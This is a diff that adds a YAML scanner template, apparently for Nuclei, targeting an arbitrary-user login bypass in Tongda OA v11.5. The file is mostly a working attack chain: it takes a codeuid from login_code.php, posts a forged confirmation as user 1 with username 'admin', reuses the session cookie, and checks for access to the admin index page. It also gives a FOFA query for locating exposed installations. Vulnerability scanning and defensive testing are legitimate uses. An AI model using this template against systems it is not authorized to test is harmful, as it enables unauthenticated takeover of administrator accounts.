@@ -1,0 +1,71 @@
+id: poc-local-oa-tongda-v11_5-login-code-php-login-bypass
+
+info:
+  name: 通达OA v11.5 login_code.php 任意用户登录
+  author: capiton
+  severity: high
+  description: 通达OA是一套办公系统。2020年04月17日, 通达OA官方在更新了一个v11版本安全补丁, 其中修复了一个任意用户伪造登录漏洞。 该漏洞类型为任意用户伪造，未经授权的远程攻击者可以通过精心构造的请求包进行任意用户伪造登录。
+  reference:
+    - http://wiki.peiqi.tech/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.5%20login_code.php%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95.html
+  metadata:
+    fofa-query: app="TDXK-通达OA"
+    Vulnerability-Impact: 通达OA 2017版、通达OA版本 V11.X < V11.5
+  tags: tongda
+
+requests:
+  - raw:
+      - |+
+        GET /ispirit/login_code.php HTTP/1.1
+        Host: {{Hostname}}
+
+      - |-
+        POST /general/login_code_scan.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        codeuid={{codeuid}}&uid=1&source=pc&type=confirm&username=admin
+      
+      - |+
+        GET /ispirit/login_code_check.php?codeuid={{codeuid}} HTTP/1.1
+        Host: {{Hostname}}
+
+      - |+
+        GET /general/index.php HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: regex
+        part: body 
+        name: codeuid
+        internal: true
+        group: 1
+        regex: 
+          - '{"codeuid":"(.*?)",'
+
+
+    cookie-reuse: true
+    req-condition: true
+    redirects: false    
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - contains(body_1,"codeuid")
+
+      - type: dsl
+        condition: and
+        dsl:
+          - contains(body_2,"\"status\":\"1\"")
+
+      - type: dsl
+        condition: and
+        dsl:
+          - contains(all_headers_3,"PHPSESSID=")
+
+      - type: dsl
+        condition: and
+        dsl:
+          - contains(body_4,"/inc/js_lang.php")
+          - contains(body_4,"/static/js/intro/show_guide.css")
+          
